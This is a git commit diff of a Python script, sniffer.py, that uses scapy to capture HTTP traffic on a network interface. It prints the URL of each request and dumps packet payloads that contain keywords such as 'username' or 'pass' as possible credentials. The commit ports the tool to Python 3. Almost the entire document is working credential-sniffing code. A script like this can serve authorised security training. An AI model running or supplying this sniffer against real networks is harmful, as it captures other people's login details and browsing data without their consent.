8ce368f0b4449b3ca55436850c0e7c60c374b533
Zero Security <155872886+Zer0Secur8ty@users.noreply.github.com>
2025-04-06 20:59:11 -0400

    sniffer.py

--- sniffer.py
+++ sniffer.py
@@ -1,38 +1,39 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 import scapy.all as scapy
 from scapy.layers import http
 import optparse
 
-        
 def get_arguments():
     parser = optparse.OptionParser()
-    parser.add_option("-i", "--interface", dest="interface", help="spcefiy an interface to sniff to ")
+    parser.add_option("-i", "--interface", dest="interface", help="Specify an interface to sniff on")
     (options, arguments) = parser.parse_args()
     return options
 
 def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=packets_sniff)
-    
 
 def get_url(packet):
-    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
-    return url
+    return packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
 
 def get_login_info(packet):
     if packet.haslayer(scapy.Raw):
         load = packet[scapy.Raw].load
+        try:
+            load_str = load.decode()
+        except:
+            load_str = load.decode(errors="ignore")
         keywords = ["username", "pass", "agent", "user", "e-mail", "mail"]
         for keyword in keywords:
-            if keyword in load:
-                return load
+            if keyword in load_str.lower():
+                return load_str
 
 def packets_sniff(packet):
     if packet.haslayer(http.HTTPRequest):
         url = get_url(packet)
-        print("[+]HTTP REQUEST >> " + url)
-        get_login = get_login_info(packet)
-        if get_login:
-            print("/n/n/possible username/pass >> " + get_login + "/n/n")
+        print("[+] HTTP Request >> " + url)
+        login_info = get_login_info(packet)
+        if login_info:
+            print("\n\n[+] Possible username/password >> " + login_info + "\n\n")
 
 options = get_arguments()
 sniff(options.interface)
